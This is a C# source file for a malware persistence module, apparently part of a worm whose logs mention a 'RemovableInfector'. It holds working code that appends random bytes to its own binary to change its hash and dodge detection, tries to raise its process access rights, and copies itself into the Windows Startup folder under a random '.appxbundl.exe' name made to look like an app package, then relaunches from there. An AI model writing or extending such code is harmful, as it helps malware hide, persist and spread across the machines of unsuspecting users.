using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace zort
{
    public static class PersistenceHelper
    {
        public static byte[] CreateClone()
        {
            // Create a clone of the application with added arbitrary data to change the hash
            byte[] selfBytes = System.IO.File.ReadAllBytes(System.Reflection.Assembly.GetExecutingAssembly().Location);
            byte[] arbitraryData = new byte[32];
            Random random = new Random();
            random.NextBytes(arbitraryData);
            byte[] cloneBytes = new byte[selfBytes.Length + arbitraryData.Length];
            Buffer.BlockCopy(selfBytes, 0, cloneBytes, 0, selfBytes.Length);
            Buffer.BlockCopy(arbitraryData, 0, cloneBytes, selfBytes.Length, arbitraryData.Length);
            return cloneBytes;
        }

        public static void SetDACL()
        {
            IntPtr ptr = NativeMethods.GetCurrentProcess();
            NativeMethods.SetProcessPrivilege(ptr, NativeMethods.ProcessAccessRights.PROCESS_ALL_ACCESS);
        }

        public static void MoveAndRunFromStartup()
        {
            try
            {
                string startupFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                string[] startupFiles = Directory.GetFiles(startupFolder, "*.appxbundl.exe");
                if(startupFiles.Length > 0)
                {
                    ModuleLogger.Log(typeof(RemovableInfector), "Already running from startup folder. attempting to replace..");
                    return;
                }

                bool error = false;
                foreach (string file in startupFiles)
                {
                    try
                    {
                        //Kill the process if it is running
                        var processName = Path.GetFileNameWithoutExtension(file);
                        var processes = Process.GetProcessesByName(processName);
                        foreach (var process in processes)
                        {
                            process.Kill();
                            ModuleLogger.Log(typeof(RemovableInfector), $"Killed existing process: {processName}");
                        }
                        File.Delete(file);
                        ModuleLogger.Log(typeof(RemovableInfector), $"Deleted existing file: {file}");
                    }
                    catch (Exception ex)
                    {
                        error = true;
                        ModuleLogger.Log(typeof(RemovableInfector), $"Error deleting file {file}: {ex.Message}");
                    }
                }

                if (error)
                {
                    ModuleLogger.Log(typeof(RemovableInfector), "Error deleting existing files. Exiting.");
                    Environment.Exit(0);
                    return;
                }

                string currentPath = Assembly.GetExecutingAssembly().Location;

                // Move self to startup folder
                string randomExecutableName = Path.GetRandomFileName() + ".appxbundl" + ".exe";

                string startupPath = Path.Combine(startupFolder, randomExecutableName);

                if (startupFolder == Path.GetDirectoryName(currentPath))
                {
                    ModuleLogger.Log(typeof(RemovableInfector), "Already running from startup folder.");
                    return;
                }

                File.Copy(currentPath, startupPath, true);
                ModuleLogger.Log(typeof(RemovableInfector), $"Moved self to startup folder: {startupPath}");

                // Start the cloned executable and exit
                System.Diagnostics.Process.Start(startupPath);
                ModuleLogger.Log(typeof(RemovableInfector), $"Started cloned executable: {startupPath}");
                ModuleLogger.Log(typeof(RemovableInfector), "Exiting original process.");
                // Exit the current process
                Environment.Exit(0);
            } catch (Exception ex)
            {
                ModuleLogger.Log(typeof(RemovableInfector), $"Error moving and running from startup: {ex.Message}");
            }
        }
    }
}
